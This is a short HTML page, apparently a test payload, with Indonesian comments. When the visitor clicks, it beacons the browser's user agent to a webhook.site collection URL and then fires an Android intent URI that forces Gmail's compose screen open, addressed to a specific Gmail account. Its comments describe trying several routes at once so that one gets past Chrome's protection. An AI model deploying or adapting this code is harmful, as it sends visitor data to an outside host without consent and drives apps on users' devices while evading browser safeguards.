<!DOCTYPE html>
<html>
<head><title>System Sync</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 50px #0f0">
        <h1 style="letter-spacing:5px">V209_FORCE_GMAIL</h1>
        <div id="status" style="font-size:18px">CLICK_TO_OPEN_NATIVE_APP</div>
    </div>

<script>
    const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";

    document.getElementById('ignite').onclick = () => {
        // 1. DATA RECON (Kirim log ke Webhook kamu)
        const recon = { id: "V209_JUMP", ua: navigator.userAgent };
        navigator.sendBeacon(`${target}?v=V209_EXEC`, btoa(JSON.stringify(recon)));

        // 2. THE FORCE INTENT
        // Kita menggunakan 'SENDTO' dengan package eksplisit agar tidak ada pilihan aplikasi lain
        const forceIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.SENDTO;" + 
            "data=mailto:ecdnts@gmail.com;" + // Menargetkan akun spesifik
            "package=com.google.android.gm;" + // MENGUNCI KE GMAIL
            "component=com.google.android.gm/.ComposeActivityGmailExternal;" +
            "S.android.intent.extra.SUBJECT=V209_STRIKE;" +
            "S.android.intent.extra.TEXT=GMAIL_NATIVE_OPENED_SUCCESSFULLY;" +
            "S.browser_fallback_url=https://mail.google.com;" + 
            "end";

        // 3. EXECUTION
        // Mencoba tiga jalur sekaligus agar salah satunya menembus proteksi Chrome
        window.location.replace(forceIntent);
        
        const a = document.createElement('a');
        a.href = forceIntent;
        a.click();
        
        document.getElementById('status').innerText = "REDIRECTING_TO_GMAIL...";
    };
</script>
</body>
</html>
